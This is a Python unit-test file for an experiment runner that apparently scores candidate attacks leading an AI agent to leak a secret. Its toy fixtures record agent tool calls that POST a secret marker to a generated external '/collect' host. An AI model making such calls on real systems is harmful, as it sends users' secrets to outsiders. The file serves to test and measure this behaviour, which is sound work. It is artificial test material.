"""Pure/toy checks for the HCMS-24 Phase-3 runner.

These tests do not instantiate any reviewed scientific profile and never touch
the canonical attempt directory.
"""

from __future__ import annotations

import importlib.util
import hashlib
import json
import tempfile
import unittest
from pathlib import Path


HERE = Path(__file__).resolve().parent
REPO = HERE.parents[1]
SPEC = importlib.util.spec_from_file_location("hcms24_phase3_v1", HERE / "hcms24_phase3_v1.py")
assert SPEC is not None and SPEC.loader is not None
RUNNER = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(RUNNER)


def load_config():
    return json.loads((REPO / "experiments/configs/hcms24-c3-v1.json").read_text(encoding="utf-8"))


class HCMS24ToyTests(unittest.TestCase):
    def setUp(self) -> None:
        self.config = load_config()

    def test_hcms_scalar_non_ledger_policy_equality(self) -> None:
        equal, digest = RUNNER.assert_hcms_scalar_policy_equality(self.config)
        self.assertTrue(equal)
        self.assertEqual(len(digest), 64)
        self.assertNotEqual(
            self.config["methods"]["hcms_calibrated"]["ledger"],
            self.config["methods"]["hcms_scalar"]["ledger"],
        )

    def test_exact_bindings_reject_content_and_tree_mutation(self) -> None:
        with tempfile.TemporaryDirectory() as raw_temp:
            root = Path(raw_temp)
            fixture_root = root / "fixtures"
            fixture_root.mkdir()
            (fixture_root / "alpha.txt").write_bytes(b"alpha")
            (fixture_root / "beta.txt").write_bytes(b"beta")
            expected = {
                "fixtures/alpha.txt": (
                    "8ed3f6ad685b959ead7022518e1af76cd816f8e8ec7ccdda1ed4018e8f2223f8"
                ),
                "fixtures/beta.txt": (
                    "f44e64e75f3948e9f73f8dfa94721c4ce8cbb4f265c4790c702b2d41cfbf2753"
                ),
            }
            self.assertEqual(RUNNER.verify_exact_bindings(root, expected), expected)
            RUNNER.verify_exact_tree(root, fixture_root, expected)

            (fixture_root / "alpha.txt").write_bytes(b"mutated")
            with self.assertRaisesRegex(AssertionError, "binding drift"):
                RUNNER.verify_exact_bindings(root, expected)
            (fixture_root / "alpha.txt").write_bytes(b"alpha")
            (fixture_root / "extra.txt").write_bytes(b"extra")
            with self.assertRaisesRegex(AssertionError, "fixture tree drift"):
                RUNNER.verify_exact_tree(root, fixture_root, expected)

    def test_williams_position_and_directed_predecessor_balance(self) -> None:
        result = RUNNER.williams_balance(
            self.config["phase3"]["counterbalanced_orders"],
            self.config["phase3"]["methods"],
        )
        self.assertTrue(result["position_pass"])
        self.assertTrue(result["predecessor_pass"])
        self.assertEqual(set(result["positions"].values()), {1})
        self.assertEqual(len(result["predecessors"]), 12)
        self.assertEqual(set(result["predecessors"].values()), {1})

    def test_exact_attribution_rejects_aggregate_false_positive(self) -> None:
        hosts = [RUNNER.expected_host(["toy", index]) for index in range(4)]
        events = [
            {
                "name": "http.post",
                "ok": True,
                "args": {"url": f"http://{host}/collect", "data": RUNNER.SECRET_MARKER},
            }
            for host in hosts
        ]
        suffixes = [events, [], [], []]
        flags = RUNNER.indexed_exact_flags(suffixes, hosts)
        self.assertEqual(sum(len(suffix) for suffix in suffixes), 4)
        self.assertEqual(flags, [True, False, False, False])
        self.assertEqual(sum(flags) / len(flags), 0.25)

    def test_candidate_evidence_is_recomputable_and_mutation_detected(self) -> None:
        host = RUNNER.expected_host(["offline", 1])
        message = RUNNER.user_message(host)
        event = {
            "name": "http.post",
            "ok": True,
            "args": {"url": f"http://{host}/collect", "data": RUNNER.SECRET_MARKER},
            "side_effect": "SHARE",
            "scope": "external",
            "source": "agent",
            "output": "posted",
        }
        trace = {"user_messages": [message], "tool_events": [event]}
        predicates = RUNNER.eval_predicates(trace)
        signature = RUNNER.cell_signature(trace["tool_events"])
        finding = {"predicates": predicates, "score_cell_signature": signature}
        row = {
            "returned_prefix": 1,
            "actual_raw": 18.0,
            "expected_raw": 18.0,
            "score_identity_valid": True,
            "hosts_json": RUNNER.canonical_json([host]),
            "messages_json": RUNNER.canonical_json([message]),
            "messages_sha256": hashlib.sha256(
                RUNNER.canonical_json([message]).encode("utf-8")
            ).hexdigest(),
            "generation_trace_suffixes_json": RUNNER.canonical_json([[event]]),
            "generation_exact_flags_json": RUNNER.canonical_json([True]),
            "generation_trace_json": RUNNER.canonical_json(trace),
            "replay_trace_suffixes_json": RUNNER.canonical_json([[event]]),
            "replay_exact_flags_json": RUNNER.canonical_json([True]),
            "replay_trace_json": RUNNER.canonical_json(trace),
            "predicates_json": RUNNER.canonical_json(predicates),
            "score_cell_signature_json": RUNNER.canonical_json(signature),
            "finding_json": RUNNER.canonical_json(finding),
        }
        recomputed = RUNNER.recompute_candidate_evidence(row)
        self.assertEqual(recomputed["actual_raw"], 18.0)
        self.assertTrue(recomputed["score_identity_valid"])

        row["replay_exact_flags_json"] = "[false]"
        with self.assertRaisesRegex(AssertionError, "replay exact flags drift"):
            RUNNER.recompute_candidate_evidence(row)

    def test_salvage_drop_and_monotone_transitions(self) -> None:
        policy = RUNNER.compile_policy("hcms_calibrated", self.config["methods"]["hcms_calibrated"])
        costs24 = [0.002 * (index + 1) for index in range(24)]
        full = RUNNER.choose_return_prefix(policy, [True] * 24, costs24, 0.0, 2.0)
        self.assertEqual(full[0], 24)
        state = RUNNER.transition_state(policy, 24, full[0])
        cliff = RUNNER.choose_return_prefix(
            policy,
            [True] * 8 + [False] * 16,
            costs24,
            0.0,
            2.0,
        )
        self.assertEqual(cliff[0], 8)
        state = RUNNER.transition_state(policy, state, cliff[0])
        self.assertEqual(state, 8)
        state = RUNNER.transition_state(policy, state, None)
        self.assertEqual(state, 1)
        self.assertLessEqual(state, 8)

    def test_cumulative_calibrated_ledger_capacity(self) -> None:
        policy = RUNNER.compile_policy("hcms_calibrated", self.config["methods"]["hcms_calibrated"])
        flags = [True] * 24
        costs = [0.04 + (0.04 / 23) * index for index in range(24)]
        used = 0.0
        admitted = 0
        while True:
            selected = RUNNER.choose_return_prefix(policy, flags, costs, used, 2.0)
            if selected is None:
                break
            used += selected[1]
            admitted += 1
        self.assertEqual(admitted, 5)
        self.assertLessEqual(used, 2.0)
        self.assertIsNone(RUNNER.choose_return_prefix(policy, flags, costs, used, 2.0))

    def test_endogenous_scalar_candidate_history_diverges(self) -> None:
        calibrated = RUNNER.compile_policy(
            "hcms_calibrated", self.config["methods"]["hcms_calibrated"]
        )
        scalar = RUNNER.compile_policy("hcms_scalar", self.config["methods"]["hcms_scalar"])
        flags = [True] * 24
        costs = [0.04 + (0.04 / 23) * index for index in range(24)]

        def endogenous_history(policy):
            used = 0.0
            state = policy["initial_state"]
            returned = []
            while True:
                proposal = RUNNER.proposed_prefix(policy, state)
                selected = RUNNER.choose_return_prefix(
                    policy,
                    flags[:proposal],
                    costs[:proposal],
                    used,
                    2.0,
                )
                if selected is None:
                    return returned, used
                used += selected[1]
                returned.append(selected[0])
                state = RUNNER.transition_state(policy, state, selected[0])

        calibrated_history, calibrated_used = endogenous_history(calibrated)
        scalar_history, scalar_used = endogenous_history(scalar)
        self.assertEqual(calibrated_history, [24] * 5)
        self.assertEqual(scalar_history, [24] * 22 + [8])
        self.assertGreater(len(scalar_history), len(calibrated_history))
        self.assertLessEqual(calibrated_used, 2.0)
        self.assertLessEqual(scalar_used, 2.0)

    def test_exception_diagnostics_link_partial_evidence_and_detect_mutation(self) -> None:
        def failing_cell_runner(**kwargs):
            kwargs["partial_candidate_rows"].append({"candidate": "retained"})
            kwargs["partial_path_rows"].append({"path": "retained"})
            kwargs["phase_state"]["phase"] = "replay_interaction"
            raise ValueError("toy diagnostic detail")

        candidates, paths, cell, diagnostics = RUNNER.execute_method_cell(
            profile={"id": "toy-profile"},
            master=7,
            order_index=2,
            position=3,
            predecessor="toy-predecessor",
            policy={"name": "toy-method"},
            clock={"outer_process_timeout_s": 1.0},
            candidate_cap=1,
            namespace="toy",
            identity_registry=set(),
            cell_runner=failing_cell_runner,
        )
        self.assertEqual(candidates, [{"candidate": "retained"}])
        self.assertEqual(paths, [{"path": "retained"}])
        self.assertEqual(cell["exception_count"], 1)
        self.assertEqual(cell["exception_id"], diagnostics[0]["exception_id"])
        self.assertEqual(diagnostics[0]["phase"], "replay_interaction")
        self.assertEqual(diagnostics[0]["exception_type"], "ValueError")
        self.assertEqual(diagnostics[0]["exception_message"], "toy diagnostic detail")
        self.assertGreater(diagnostics[0]["elapsed_s"], 0.0)
        RUNNER.validate_exception_diagnostic(diagnostics[0], candidates, paths)

        diagnostics[0]["traceback"] += "mutation"
        with self.assertRaisesRegex(AssertionError, "traceback hash drift"):
            RUNNER.validate_exception_diagnostic(diagnostics[0], candidates, paths)

    def test_safety_namespace_is_mechanically_excluded(self) -> None:
        rows = [
            {"namespace": "primary", "raw": 10},
            {"namespace": "safety", "raw": 10_000},
        ]
        selected = RUNNER.primary_only(rows)
        self.assertEqual(len(selected), 1)
        self.assertEqual(sum(row["raw"] for row in selected), 10)

    def test_reloaded_schema_and_aggregate_mutations_are_rejected(self) -> None:
        cells = []
        for index, method in enumerate(RUNNER.METHODS):
            cells.append(
                {
                    "namespace": "primary",
                    "profile": "toy-profile",
                    "method": method,
                    "candidate_count": index + 1,
                    "raw": float(index + 10),
                    "generation_elapsed_s": 0.1,
                    "actual_replay_total_s": 0.2,
                    "replay_coverage_numerator": index + 1,
                    "replay_coverage_denominator": index + 1,
                    "actual_replay_overage": False,
                    "cell_valid": True,
                }
            )
        profile_rows, method_rows = RUNNER.aggregate_rows(cells)
        RUNNER.validate_aggregate_rows(cells, profile_rows, method_rows)
        method_rows[0]["raw"] += 1.0
        with self.assertRaisesRegex(AssertionError, "method aggregate drift"):
            RUNNER.validate_aggregate_rows(cells, profile_rows, method_rows)

        with tempfile.TemporaryDirectory() as raw_temp:
            path = Path(raw_temp) / "toy.tsv"
            RUNNER.write_tsv_exclusive(
                path,
                ("schema_version", "value"),
                [{"schema_version": "toy-v1", "value": 1}],
            )
            self.assertEqual(
                RUNNER.read_tsv_exact(path, ("schema_version", "value"), "toy-v1"),
                [{"schema_version": "toy-v1", "value": "1"}],
            )
            path.write_text("schema_version\tmutated\ntoy-v1\t1\n", encoding="utf-8")
            with self.assertRaisesRegex(AssertionError, "header drift"):
                RUNNER.read_tsv_exact(path, ("schema_version", "value"), "toy-v1")

    def test_full_output_bundle_is_reloaded_before_completion(self) -> None:
        def cell(namespace, profile, master, order_index, position, predecessor, method):
            return {
                "schema_version": "hcms24-method-cell-v1",
                "namespace": namespace,
                "profile": profile,
                "master": master,
                "order_index": order_index,
                "position": position,
                "predecessor": predecessor,
                "method": method,
                "candidate_count": 0,
                "attempted_paths": 0,
                "dropped_paths": 0,
                "generation_elapsed_s": 0.0,
                "generation_overage": False,
                "ledger_charge_total_s": 0.0,
                "actual_replay_total_s": 0.0,
                "actual_replay_overage": False,
                "replay_coverage_numerator": 0,
                "replay_coverage_denominator": 0,
                "raw": 0.0,
                "invalid_attribution_count": 0,
                "duplicate_identity_count": 0,
                "score_identity_failure_count": 0,
                "timeout_count": 0,
                "incomplete_count": 0,
                "exception_count": 0,
                "exception_id": "",
                "cell_valid": True,
                "transition_sequence_json": "[]",
            }

        cells = []
        orders = self.config["phase3"]["counterbalanced_orders"]
        for profile in ("p1", "p2", "p3"):
            for master in (1, 2, 3):
                for order_index, order in enumerate(orders):
                    for position, method in enumerate(order):
                        cells.append(
                            cell(
                                "primary",
                                profile,
                                master,
                                order_index,
                                position,
                                "none" if position == 0 else order[position - 1],
                                method,
                            )
                        )
        cells.append(cell("safety", "safety", 1, 0, 0, "none", "hcms_calibrated"))
        profile_rows, method_rows = RUNNER.aggregate_rows(cells[:-1])
        tsv_rows = {
            "candidates.tsv": [],
            "paths.tsv": [],
            "method_cells.tsv": cells,
            "profile_summary.tsv": profile_rows,
            "method_summary.tsv": method_rows,
        }
        json_values = {
            "fixture_results.json": {"schema_version": "hcms24-fixtures-v1"},
            "primary_summary.json": {
                "schema_version": "hcms24-primary-summary-v1",
                "hcms_aggregate_raw": 0.0,
                "fixed8_aggregate_raw": 0.0,
                "fixed24_no_salvage_aggregate_raw": 0.0,
                "invalidity_counts": {"malformed_artifact_count": 0},
            },
            "safety.json": {"schema_version": "hcms24-safety-v1"},
            "provenance.json": {"schema_version": "hcms24-provenance-v1"},
            "exceptions.json": {"schema_version": "hcms24-exceptions-v1", "records": []},
        }
        with tempfile.TemporaryDirectory() as raw_temp:
            attempt = Path(raw_temp)
            for name, rows in tsv_rows.items():
                fields, _schema = RUNNER.TSV_SPECS[name]
                RUNNER.write_tsv_exclusive(attempt / name, fields, rows)
            for name, value in json_values.items():
                RUNNER.write_json_exclusive(attempt / name, value)
            reloaded = RUNNER.reload_and_validate_outputs(
                attempt,
                expected_tsv_rows=tsv_rows,
                expected_json_values=json_values,
            )
            self.assertEqual(len(reloaded["tsv"]["method_cells.tsv"]), 145)
            method_path = attempt / "method_summary.tsv"
            method_path.write_text(
                method_path.read_text(encoding="utf-8").replace("\t0.0\t", "\t1.0\t", 1),
                encoding="utf-8",
            )
            with self.assertRaisesRegex(AssertionError, "reloaded row drift"):
                RUNNER.reload_and_validate_outputs(
                    attempt,
                    expected_tsv_rows=tsv_rows,
                    expected_json_values=json_values,
                )

    def test_attempt_refusal_and_complete_last_manifest(self) -> None:
        with tempfile.TemporaryDirectory() as raw_temp:
            root = Path(raw_temp)
            runs = root / "experiments" / "runs"
            runs.mkdir(parents=True)
            relative = Path("experiments/runs/toy-attempt")
            attempt = root / relative
            attempt.mkdir()
            command = "python toy_runner.py --attempt-dir experiments/runs/toy-attempt"
            (attempt / "run.log").write_text(command + "\n", encoding="utf-8")
            validated = RUNNER.validate_attempt_directory(
                relative,
                repo_root=root,
                expected_relative=relative,
                expected_command=command,
            )
            self.assertEqual(validated, attempt)
            output_names = ("one.json", "two.tsv")
            (attempt / "one.json").write_text("{}\n", encoding="utf-8")
            (attempt / "two.tsv").write_text("schema_version\ntoy-v1\n", encoding="utf-8")

            class AppendStream:
                def write(self, value):
                    with (attempt / "run.log").open("a", encoding="utf-8") as handle:
                        return handle.write(value)

                def flush(self):
                    return None

            metric_lines = ["status: toy", "runtime_seconds: 0.000000001"]
            run_log_digest = RUNNER.print_flush_and_wait_for_log(
                metric_lines,
                attempt / "run.log",
                stream=AppendStream(),
                timeout_s=0.1,
            )
            self.assertFalse((attempt / "COMPLETE.json").exists())
            complete = RUNNER.publish_complete(
                attempt,
                output_names=output_names,
                status="toy",
                command=command,
                bindings={"toy": "0" * 64},
            )
            self.assertEqual(complete.name, "COMPLETE.json")
            manifest = RUNNER.validate_complete_manifest(
                attempt,
                output_names=output_names,
                command=command,
            )
            self.assertEqual(set(manifest["artifacts"]), {"run.log", *output_names})
            self.assertEqual(manifest["artifacts"]["run.log"], run_log_digest)
            with (attempt / "run.log").open("a", encoding="utf-8") as handle:
                handle.write("late output\n")
            with self.assertRaisesRegex(AssertionError, "artifact hash drift: run.log"):
                RUNNER.validate_complete_manifest(
                    attempt,
                    output_names=output_names,
                    command=command,
                )
            with self.assertRaises(AssertionError):
                RUNNER.validate_attempt_directory(
                    relative,
                    repo_root=root,
                    expected_relative=relative,
                    expected_command=command,
                )


if __name__ == "__main__":
    unittest.main()
